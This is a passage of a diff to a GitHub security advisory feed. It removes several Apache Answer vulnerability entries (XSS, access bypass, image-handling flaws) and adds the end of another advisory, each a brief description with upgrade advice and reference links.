+<li><a href="https://github.com/advisories/GHSA-gwfq-86j8-7qhv">https://github.com/advisories/GHSA-gwfq-86j8-7qhv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gwfq-86j8-7qhv</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-08-05T19:59:55.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[oras.land/oras-go/v2] `oras-go` tar extraction: Hardlink entry with relative Linkname escapes extract dir via process CWD resolution]]></title>
         <id>https://github.com/advisories/GHSA-fxhp-mv3v-67qp</id>
@@ -1343,113 +1824,5 @@ recommended action.</p>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-07-31T16:10:57.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/apache/incubator-answer] Apache Answer vulnerable to Cross-site Scripting]]></title>
-        <id>https://github.com/advisories/GHSA-6qwm-5fm9-cvjx</id>
-        <link href="https://github.com/advisories/GHSA-6qwm-5fm9-cvjx"/>
-        <updated>2026-07-31T15:53:23.000Z</updated>
-        <content type="html"><![CDATA[<p>Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS) vulnerability in Apache Answer.</p>
-<p>This issue affects Apache Answer: through 2.0.0.</p>
-<p>User-supplied content was included in notification emails without proper escaping, allowing authenticated users to inject arbitrary HTML into emails sent to other users.
-Users are recommended to upgrade to version 2.0.1, which fixes the issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34033">https://nvd.nist.gov/vuln/detail/CVE-2026-34033</a></li>
-<li><a href="https://lists.apache.org/thread/wrfd9blbfotfg479jr8vlwfx6pwr9sgj">https://lists.apache.org/thread/wrfd9blbfotfg479jr8vlwfx6pwr9sgj</a></li>
-<li><a href="http://www.openwall.com/lists/oss-security/2026/06/09/3">http://www.openwall.com/lists/oss-security/2026/06/09/3</a></li>
-<li><a href="https://github.com/apache/answer/commit/d1a4092c61ccd41988d1033fce47eb513adb433e">https://github.com/apache/answer/commit/d1a4092c61ccd41988d1033fce47eb513adb433e</a></li>
-<li><a href="https://github.com/apache/answer/releases/tag/v2.0.1">https://github.com/apache/answer/releases/tag/v2.0.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-6qwm-5fm9-cvjx">https://github.com/advisories/GHSA-6qwm-5fm9-cvjx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-6qwm-5fm9-cvjx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-09T09:32:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/apache/incubator-answer] Apache Answer has an Exposure of Sensitive Information to an Unauthorized Actor vulnerability]]></title>
-        <id>https://github.com/advisories/GHSA-85r2-pvg8-89r9</id>
-        <link href="https://github.com/advisories/GHSA-85r2-pvg8-89r9"/>
-        <updated>2026-07-31T15:51:05.000Z</updated>
-        <content type="html"><![CDATA[<p>Exposure of Sensitive Information to an Unauthorized Actor vulnerability in Apache Answer.</p>
-<p>This issue affects Apache Answer: through 2.0.0.</p>
-<p>The unlisted question feature did not enforce access restrictions on direct API endpoints, allowing authenticated users to discover and access unlisted questions, their answers, comments, and revision history.
-Users are recommended to upgrade to version 2.0.1, which fixes the issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34905">https://nvd.nist.gov/vuln/detail/CVE-2026-34905</a></li>
-<li><a href="https://lists.apache.org/thread/khxoft96sptr2kh0cpzgw7f6qwv0ltcf">https://lists.apache.org/thread/khxoft96sptr2kh0cpzgw7f6qwv0ltcf</a></li>
-<li><a href="http://www.openwall.com/lists/oss-security/2026/06/09/2">http://www.openwall.com/lists/oss-security/2026/06/09/2</a></li>
-<li><a href="https://github.com/apache/answer/commit/11c80384f13a27e27c871c05bb353489d1363ee2">https://github.com/apache/answer/commit/11c80384f13a27e27c871c05bb353489d1363ee2</a></li>
-<li><a href="https://github.com/apache/answer/releases/tag/v2.0.1">https://github.com/apache/answer/releases/tag/v2.0.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-85r2-pvg8-89r9">https://github.com/advisories/GHSA-85r2-pvg8-89r9</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-85r2-pvg8-89r9</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-09T09:32:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/apache/incubator-answer] Apache Answer has an Unrestricted Upload of File with Dangerous Type vulnerability]]></title>
-        <id>https://github.com/advisories/GHSA-v553-g2w6-295p</id>
-        <link href="https://github.com/advisories/GHSA-v553-g2w6-295p"/>
-        <updated>2026-07-31T15:49:10.000Z</updated>
-        <content type="html"><![CDATA[<p>Unrestricted Upload of File with Dangerous Type vulnerability in Apache Answer.</p>
-<p>This issue affects Apache Answer: through 2.0.0.</p>
-<p>A crafted TIFF image could trigger excessive memory allocation during image decoding, allowing an authenticated user to cause the server process to crash.
-Users are recommended to upgrade to version 2.0.1, which fixes the issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33582">https://nvd.nist.gov/vuln/detail/CVE-2026-33582</a></li>
-<li><a href="https://lists.apache.org/thread/3sgpx4cwsgpnt66xv3cqvtc8z4st1kbq">https://lists.apache.org/thread/3sgpx4cwsgpnt66xv3cqvtc8z4st1kbq</a></li>
-<li><a href="http://www.openwall.com/lists/oss-security/2026/06/09/5">http://www.openwall.com/lists/oss-security/2026/06/09/5</a></li>
-<li><a href="https://github.com/apache/answer/commit/cfc3e54f30cc5e01afb7110ecc1da9152d0a3a41">https://github.com/apache/answer/commit/cfc3e54f30cc5e01afb7110ecc1da9152d0a3a41</a></li>
-<li><a href="https://github.com/apache/answer/releases/tag/v2.0.1">https://github.com/apache/answer/releases/tag/v2.0.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-v553-g2w6-295p">https://github.com/advisories/GHSA-v553-g2w6-295p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-v553-g2w6-295p</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-09T09:32:07.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/apache/incubator-answer] Apache Answer has an Unrestricted Upload of File with Dangerous Type vulnerability]]></title>
-        <id>https://github.com/advisories/GHSA-x4f6-mqg6-28xx</id>
-        <link href="https://github.com/advisories/GHSA-x4f6-mqg6-28xx"/>
-        <updated>2026-07-31T15:45:20.000Z</updated>
-        <content type="html"><![CDATA[<p>Unrestricted Upload of File with Dangerous Type vulnerability in Apache Answer.</p>
-<p>This issue affects Apache Answer: through 2.0.0.</p>
-<p>The server did not sufficiently validate user-supplied image URLs, allowing arbitrary external content to be embedded as profile images, which could expose users to unintended external requests and tracking by third-party servers.
-Users are recommended to upgrade to version 2.0.1, which fixes the issue.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-34031">https://nvd.nist.gov/vuln/detail/CVE-2026-34031</a></li>
-<li><a href="https://lists.apache.org/thread/rwtxy39t54to9kv3dqtbjsbdpyk4jkd2">https://lists.apache.org/thread/rwtxy39t54to9kv3dqtbjsbdpyk4jkd2</a></li>
-<li><a href="http://www.openwall.com/lists/oss-security/2026/06/09/4">http://www.openwall.com/lists/oss-security/2026/06/09/4</a></li>
-<li><a href="https://github.com/apache/answer/commit/11091244f64e5a7e472edcd477c1ff4124eca7c3">https://github.com/apache/answer/commit/11091244f64e5a7e472edcd477c1ff4124eca7c3</a></li>
-<li><a href="https://github.com/apache/answer/releases/tag/v2.0.1">https://github.com/apache/answer/releases/tag/v2.0.1</a></li>
-<li><a href="https://github.com/advisories/GHSA-x4f6-mqg6-28xx">https://github.com/advisories/GHSA-x4f6-mqg6-28xx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-x4f6-mqg6-28xx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-09T09:32:07.000Z</published>
     </entry>
 </feed>
